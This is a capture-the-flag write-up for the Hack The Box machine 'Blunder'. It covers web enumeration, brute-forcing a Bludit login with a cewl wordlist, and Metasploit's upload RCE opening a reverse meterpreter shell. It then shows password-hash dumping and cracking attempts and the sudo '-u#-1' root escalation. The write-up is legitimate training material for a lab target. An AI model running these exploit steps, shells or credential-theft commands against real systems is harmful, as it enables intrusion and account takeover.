# Blunder

- Linux
- 10.10.10.191

-----

## Enumeration

### Nmap

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ nmap 10.10.10.191 -A
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 23:51 BST
Nmap scan report for 10.10.10.191
Host is up (0.021s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

### Gobuster

```shell
## Initial
kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x .txt -s 200,302
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191
[+] Threads:        50
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/09/28 00:39:00 Starting gobuster
===============================================================
/0 (Status: 200)
/LICENSE (Status: 200)
/about (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
===============================================================
2020/09/28 00:39:54 Finished
===============================================================
```

## Admin portal
http://10.10.10.191/admin/

- Generic admin login portal
- Uses **Bludit**: https://www.bludit.com/
    - Bludit has a **GitHub repo** with public code: https://github.com/bludit/bludit
- Login sends post request to /admin
    ```
    tokenCSRF: [changes every time]
    username: user
    password: pass
    remember: true/false
    ```
- **Login form uses input sanitization**, potentially tricky to SQLI: https://github.com/bludit/bludit/blob/2656785bcb6ea0b054a8f8d6e9b30d88b429c28e/bl-kernel/login.class.php#L92
- Bludit creates a default **admin** user: https://docs.bludit.com/en/security/disable-admin-user#sidebar

bl-themes traversal
---
After digging around in bl-themes, found can access directory

----
http://10.10.10.191/usb%0
```
Bad Request

Your browser sent a request that this server could not understand.
Apache/2.4.41 (Ubuntu) Server at 10.10.10.191 Port 80
```

Notably, the request also generates a cookie.
```
Cookie: BLUDIT-KEY=en4mdn84bps7btakg2s64jj8j0
```

## Interesting directories

I moved back to the ho epage.
Search for more hints.
Noticed `src=##` references to `/bl-kernel`.
The directory is traversable.

```
[DIR]	abstract/	2019-06-21 10:02 	- 	 
[DIR]	admin/	2019-06-21 10:02 	- 	 
[DIR]	ajax/	2019-06-21 10:02 	- 	 
[DIR]	boot/	2019-11-27 13:58 	- 	 
[ ]	categories.class.php	2019-06-21 10:02 	869 	 
[ ]	category.class.php	2019-06-21 10:02 	1.6K	 
[DIR]	css/	2019-06-21 10:02 	- 	 
[ ]	functions.php	2019-06-21 10:02 	20K	 
[DIR]	helpers/	2019-06-21 10:02 	- 	 
[DIR]	img/	2019-06-21 10:02 	- 	 
[DIR]	js/	2019-06-21 10:02 	- 	 
[ ]	language.class.php	2019-06-21 10:02 	3.3K	 
[ ]	login.class.php	2019-06-21 10:02 	4.5K	 
[ ]	pages.class.php	2019-06-21 10:02 	19K	 
[ ]	pagex.class.php	2019-06-21 10:02 	13K	 
[ ]	parsedown.class.php	2019-06-21 10:02 	41K	 
[ ]	security.class.php	2019-06-21 10:02 	2.9K	 
[ ]	site.class.php	2019-06-21 10:02 	8.1K	 
[ ]	syslog.class.php	2019-06-21 10:02 	1.6K	 
[ ]	tag.class.php	2019-06-21 10:02 	1.3K	 
[ ]	tags.class.php	2019-06-21 10:02 	824 	 
[ ]	url.class.php	2019-06-21 10:02 	4.2K	 
[ ]	user.class.php	2019-06-21 10:02 	2.4K	 
[ ]	users.class.php	2019-06-21 10:02 	4.8K	 
```

Though there's nothing immediately striking about this directory, there could be some vulnerabilities.
Potential some file-uploads vulns, RCEs or credentials.

On browsing to the first layer of PHP files, we're returned the text:
```
Bludit CMS.
```

Perhaps there're other folders that we can enumerate.
I sought out a [general Bludit file structure](https://docs.bludit.com/en/developers/folder-structure).
 
```
/bl-content/    <-- Databases and uploaded images
/bl-kernel/     <-- Core of Bludit
/bl-languages/  <-- Languages files
/bl-plugins/    <-- Plugins
/bl-themes/     <-- Themes
```

We've already been into the core. 
But, we've not really enumerated `/bl-content`.
Where there's databases and images.

From the same link about we can see the general heirarchy.
```
/bl-content/

    databases/
        plugins/        <-- Database: plugins
        pages.php       <-- Database: pages
        security.php    <-- Database: black list, brute force protection, others
        site.php        <-- Database: site variables, name, description, slogan, others
        tags.php        <-- Database: tags
        users.php       <-- Database: users

    pages/              <-- Content: pages
        about/index.txt
        food/index.txt

    tmp/                <-- Temp files

    uploads/            <-- Uploaded files
        profiles/       <-- Profiles images
        thumbnails/     <-- Thumbnails images
        photo1.jpg
        photo2.png

    workspaces/         <-- Workspaces for the plugins
```

A lot of the folders were empty. 

```
http://10.10.10.191/bl-content/uploads/pages/
```
```
[PARENTDIR]	Parent Directory	 	- 	 
[DIR]	0f4cb7ec3d9a6220088e71bbf94241e9/	2020-05-15 09:01 	- 	 
[DIR]	01eb84f78fb13a1556fb47f895b14ee5/	2020-05-19 11:33 	- 	 
[DIR]	4eac94aba9d8dc2ac016d5510e056920/	2019-11-27 14:55 	- 	 
[DIR]	8be4cda4c541fddef2931bf60bf9e9c7/	2020-04-28 16:26 	- 	 
[DIR]	8efa8527e4e031625b1afb72ec16d748/	2020-04-28 16:24 	- 	 
[DIR]	8f67086c56c71267f5a61c97ba5f9005/	2020-04-28 13:45 	- 	 
[DIR]	9c74adac55b0a947cf5dea55d0b33647/	2020-05-19 10:25 	- 	 
[DIR]	3132ad4d7264ccc21a2c8e3f5021c732/	2020-04-28 16:29 	- 	 
[DIR]	51639192d74dcb693d19acadcb516895/	2020-04-28 16:25 	- 	 
[DIR]	742956599d726bca3c205a91fae31b9f/	2020-05-19 10:51 	- 	 
[DIR]	ac913dd69472590941f1a5dc20ea2ef8/	2019-11-28 13:07 	- 	 
[DIR]	b6b006cc2ae8be61c779f6805ca803c7/	2019-11-27 08:13 	- 	 
[DIR]	c79e4026e443c607d45f06e5c9156deb/	2020-04-28 16:28 	- 	 
[DIR]	f1ae807a84323f70c148e710199e186e/	2020-04-28 13:54 	- 	 
```

We find the Bludit version is 3.9.2 in sitemap JSON.
```json
// view-source:http://10.10.10.191/bl-plugins/backup/metadata.json
{
	"author": "Bludit",
	"email": "",
	"website": "https://plugins.bludit.com",
	"version": "3.9.2",
	"releaseDate": "2019-06-21",
	"license": "MIT",
	"compatible": "3.9.2",
	"notes": ""
}
```

Confirming the [sitemap plugin reflects the Bludit version](https://github.com/bludit/bludit/blob/master/bl-plugins/sitemap/metadata.json).

With the newly found versioning data, we can search for a CVE.

Find a [Blundit exploit no Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec), with reference to a Metasploit module.

However, on further inspection this is not currently useful.
The above linked exploit requires username and password.

I delved further into the [Bludit releases](https://github.com/bludit/bludit/releases) section of their Github repo.

We can see version notes for 3.9.2, and also more importantly fixes that were made in 3.10.

3.10.0 changelog states, amongst other changes:
```
Fixed security vulnerability for Code Execution Vulnerability in "Images Upload. #1079
Fixed security vulnerability for Code Execution Vulnerability in "Upload function". #1081
Fixed security vulnerability to store Javascript code on categories fields and user profile fields.
Fixed security vulnerability for Bypass brute force protection. Thanks to @rastating for report it and fixed it.
```

And in 3.9.2 changelog states, amongst other changes:
```
API, included the following field when get a page date, dateRaw and username.
```

In the later version, a few vulns were fixed. 
As we know, we're running on 3.9.2 so these vulns will still be there.
I have a feeling that the Rapid 7 exploit mentioned prior to this is likely aimed at these. The upload function.
Interestingly, there're two others that _may_ help. 
- Bruteforce bypass (we still need a username) 
- JS injection (although unlikely to help).

In the second changelog excert, I noted the addition of the API.
Perhaps we can exploit this to enumerate users.
The [Bludit docs mentioned some API endpoints](https://docs.bludit.com/en/api/introduction).

This doesn't seem to be activated however.
 
## Taking a step back

I figured I was probably trying to over-engineer an exploit.
In the intial Gobuster scan, we found a file `todo.txt`. 
It's in the homepage directory.

Forgive me for the previous rabbit hole.
This is a box that I've come back to!
Lesson: always re-read your write-up before continuing.

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Above is the todo text. 
It mentions user fergus.

## Bruteforcing fergus

This is really our only lead.
Armed with the information of potential exploits in the previous rabbithole, we can try to attack `fergus`.

There's a ruby module for bruteforce bypass on `searchsploit`.

```
kali@kali:~$ searchsploit bludit brute
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypas | php/webapps/48746.rb
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Copied the module.

```
kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ searchsploit -m php/webapps/48746.rb
  Exploit: Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass
      URL: https://www.exploit-db.com/exploits/48746
     Path: /usr/share/exploitdb/exploits/php/webapps/48746.rb
File Type: Ruby script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/Desktop/repos/ctf/hack-the-box/blunder/48746.rb
```

I read the module in vi.
There's a nice set of documentation for this module.

```ruby
  Bludit <= 3.9.2 - Authentication Bruteforce Mitigation Bypass

  Usage:
    #{__FILE__} -r <url> -u <username> -w <path> [--debug]
    #{__FILE__} -H | --help

  Options:
    -r <url>, --root-url <url>            Root URL (base path) including HTTP scheme, port and root folder
    -u <username>, --user <username>      Username of the admin
    -w <path>, --wordlist <path>          Path to the wordlist file
    --debug                               Display arguments
    -H, --help                            Show this screen

  Examples:
    #{__FILE__} -r http://example.org -u admin -w myWordlist.txt
    #{__FILE__} -r https://example.org:8443/bludit -u john -w /usr/share/wordlists/password/rockyou.txt
```

Armed with our user, lets try run it.
This was a bit of an ordeal at first.

Ruby didn't seem to have the modules:
- httpclient
- docopt

I installed them with

```
sudo gem install httpclient;
sudo gem install docopt;
```

Following the downloads, another error occured with regards to some `HTTP::Cookie` not initialised error.

The exploit has comments surrounding the errorneous section.
I commented out the updates and the exploit works as expected.
Though a few changes were needed.

```ruby
## I commented out this section...

# dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
#class WebAgent
#  class Cookie < HTTP::Cookie
#    def domain
#      self.original_domain
#    end
#  end
#end

```

And the ran exploit with the following command. 

```shell
sudo ruby 48746.rb -r http://10.10.10.191 -u fergus -w /usr/share/wordlists/rockyou.txt
```

I let this run for about an hour, but to no avail.
At which point, I snuck a look at [another Blunder writeup](https://fmash16.github.io/content/writeups/hackthebox/htb-Blunder.html).
It mentioned the tool `cewl`.

Cewl is a prepackaged Kali linux tool.
It can be used to extract data from a webpages.
Recursing through links and directories on-page.

This data can be used to build a wordlist.
Keywords are pulled from on-page text and meta-data.
I ran cewl against the site's home page

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ cewl http://10.10.10.191
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
the
Load
Plugins
and
for
Include
Site
Page
has
About
King
with
USB
...
...
## there's a tonne of keywords
```

It piped this list into a wordlist.
Then ran it the new list through the bruteforce exploit.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ cewl http://10.10.10.191 > cewl_blunder.txt
```

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ sudo ruby 48746.rb -r http://10.10.10.191/admin -u fergus -w cewl_blunder.txt
[sudo] password for kali:
ruby: warning: shebang line ending with \r may cause problems
[*] Trying password: CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[*] Trying password: the
[*] Trying password: Load
[*] Trying password: Plugins

... ## many lines ...

[*] Trying password: and
[*] Trying password: for
[*] Trying password: RolandDeschain

[+] Password found: RolandDeschain

```

Eventually finding a successful set of credentials!
```
fergus:RolandDeschain
```

## Access Admin Panel

Logged into /admin.

On login, tried to enumerate more users.
But, `fergus` doesn't have permissiosn to view users, nor categories.

We can only see another user `admin`.

Despite lacking some permissions, we can create new content.

```
http://10.10.10.191/admin/new-content
```

We previously stumbled on multiple potential vulnerabilities.
All of which, related to file upload.
The new content page allows us to upload files.
Perhaps we can exploit this manually.

## Upload exploit

On attempting to upload a non-image file, we get an error.

```
File type is not supported. Allowed types: gif, png, jpg, jpeg, svg
```

I found an exploit via searchsploit.
It's a ruby exploit.
The vulnerability exploit is in the following function.

```ruby
 def upload_php_payload_and_exec(login_badge)
    # From: /var/www/html/bludit/bl-content/uploads/pages/5821e70ef1a8309cb835ccc9cec0fb35/
    # To: /var/www/html/bludit/bl-content/tmp
    uuid = get_uuid(login_badge)
    php_payload = get_php_payload
    upload_file(login_badge, '../../tmp', php_payload.payload, php_payload.name)

    # On the vuln app, this line occurs first:
    # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
    # Even though there is a file extension check, it won't really stop us
    # from uploading the .htaccess file.
    htaccess = <<~HTA
    RewriteEngine off
    AddType application/x-httpd-php .png
    HTA
    upload_file(login_badge, uuid, htaccess, ".htaccess")
    register_file_for_cleanup('.htaccess')

    print_status("Executing #{php_payload.name}...")
    send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'bl-content', 'tmp', php_payload.name)
    })
  end
```

It seems to upload a rogue .htaccess file that allows PHP uploads.
After the .htaccess file, it uploads a PHP exploit file.

I was going to manually implement this.
Feels like procrastinating against getting flags and shell.

Lets run the exploit through Metasploit

```shell
$ msfconsole
## ....
msf5 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability

msf5 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf5 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2

msf5 exploit(linux/http/bludit_upload_images_exec) > set bluditpass RolandDeschain
bluditpass => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set bludituser fergus
bludituser => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set rhosts 10.10.10.191
rhosts => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set lhost tun0
lhost => tun0
msf5 exploit(linux/http/bludit_upload_images_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.5:4444
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading WsNfOGdZfz.png...
[*] Uploading .htaccess...
[*] Executing WsNfOGdZfz.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.191:51734) at 2020-10-04 16:20:13 +0100
[+] Deleted .htaccess

meterpreter > ls
Listing: /var/www/bludit-3.9.2/bl-content/tmp
=============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40755/rwxr-xr-x   4096  dir   2020-10-04 16:24:35 +0100  thumbnails
100600/rw-------  0     fil   2020-10-04 15:49:24 +0100  upload_exploit.jpg.php
100600/rw-------  0     fil   2020-10-04 15:49:37 +0100  upload_exploit.jpg; upload_exploit.php
100600/rw-------  0     fil   2020-10-04 15:50:21 +0100  upload_exploit.php
```

## User enum, privesc

Pulled the /etc/passwd file. 
That way we can find all the users.

```shell
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
temp:x:1002:1002:,,,:/home/temp:/bin/bash
```

Pulled 3 users:
- root
- shaun
- hugo
- temp

Had a look for flags. But dont have permissions to read from /home/hugo.

```shell
meterpreter > cd /home/hugo
meterpreter > ls
Listing: /home/hugo
===================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
20666/rw-rw-rw-   0     cha   2020-10-04 01:35:26 +0100  .bash_history
100644/rw-r--r--  220   fil   2019-11-28 09:59:55 +0000  .bash_logout
100644/rw-r--r--  3771  fil   2019-11-28 09:59:55 +0000  .bashrc
40700/rwx------   4096  dir   2020-04-27 14:29:47 +0100  .cache
40700/rwx------   4096  dir   2019-11-28 11:37:37 +0000  .config
40700/rwx------   4096  dir   2020-04-27 14:30:11 +0100  .gnupg
40775/rwxrwxr-x   4096  dir   2019-11-28 10:03:01 +0000  .local
40700/rwx------   4096  dir   2020-04-27 14:29:46 +0100  .mozilla
100644/rw-r--r--  807   fil   2019-11-28 09:59:55 +0000  .profile
40700/rwx------   4096  dir   2020-04-27 14:30:11 +0100  .ssh
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Desktop
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Documents
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Downloads
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Music
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Pictures
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Public
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Templates
40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Videos
100400/r--------  33    fil   2020-10-04 01:37:03 +0100  user.txt

meterpreter > cat user.txt
[-] core_channel_open: Operation failed: 1
meterpreter > shell
Process 7297 created.
Channel 1 created.
whoami
www-data
```

Notably, both `hugo` and `shaun` have .ssh folders.
But, we don't have permissions to read.

I ran a find command to find some files with SUID.
Found interesting files.

```shell
find / -type f -perm /4000 2>/dev/null | grep -v /snap/
/usr/local/bin/sudo
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/vmware-user-suid-wrapper
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/chfn
/usr/sbin/pppd
```

Unsure why there's a random `sudo` in `/usr/local`...

```shell
ls -lah /usr/local/bin
total 1.8M
drwxr-xr-x  2 root root 4.0K Apr 27 13:52 .
drwxr-xr-x 11 root root 4.0K Apr 27 13:52 ..
-rwxr-xr-x  1 root root 1.1M Apr 27 13:52 cvtsudoers
-rwsr-xr-x  1 root root 560K Apr 27 13:52 sudo
lrwxrwxrwx  1 root root    4 Apr 27 13:52 sudoedit -> sudo
-rwxr-xr-x  1 root root 186K Apr 27 13:52 sudoreplay
```

Searched around for some credentials to exploit. 
After locating where Bludit stores passwords, pulled the hashes.
These may be reused.

```shell 
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
cat users.php

```
```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}
```

We've already got the password for fergus.
Now to try crack the admin password.
Looks like SHA-1.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ hashid bfcc887f62e36ea019e3295aafb8a3885966e265
Analyzing 'bfcc887f62e36ea019e3295aafb8a3885966e265'
[+] SHA-1
[+] Double SHA-1
[+] RIPEMD-160
[+] Haval-160
[+] Tiger-160
[+] HAS-160
[+] LinkedIn
[+] Skein-256(160)
[+] Skein-512(160)
```

Can [crack salted SHA-1 with hashcat](https://hashcat.net/wiki/doku.php?id=hashcat).
First need to maninpulate the has such that it's crackable.
```shell
bfcc887f62e36ea019e3295aafb8a3885966e265:5dde2887e7aca
```

I wrote to this to a file.
Mode 110 requires `$pass.$salt`.
Just seperate the two values with `:`.
Then ran with hashcat.
The `cewl` list we generated didn't work for this.

```shell

kali@kali:~/Desktop/repos/ctf/hack-the-box/blunder$ hashcat -a 0 -m 110 blundit_admin_hash.txt cewl_blunder.txt                        
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz, 13903/13967 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: cewl_blunder.txt
* Passwords.: 350
* Bytes.....: 2573
* Keyspace..: 350
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Name........: sha1($pass.$salt)
Hash.Target......: bfcc887f62e36ea019e3295aafb8a3885966e265:5dde2887e7aca
Time.Started.....: Sun Oct  4 18:27:00 2020 (0 secs)
Time.Estimated...: Sun Oct  4 18:27:00 2020 (0 secs)
Guess.Base.......: File (cewl_blunder.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   168.4 kH/s (0.11ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 350/350 (100.00%)
Rejected.........: 0/350 (0.00%)
Restore.Point....: 350/350 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) -> etc

Started: Sun Oct  4 18:26:02 2020
Stopped: Sun Oct  4 18:27:02 2020

```

Tried rock you instead, but to no avail.
Resorted to seeing if there were any public cracks for this.

There were none for the Administrator password.

However, there was another install; a Blundit 3.10 install.
This could hold some credentials that we've not seen yet.

We found some more creds.
And, they're for `hugo`.

```shell
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Wierdly, theres no salt.

```shell
hugo:Password120
```

We can then `su hugo`.

Then exploit CVE sudo.

```shell
sudo -u#-1 /bin/bash

```

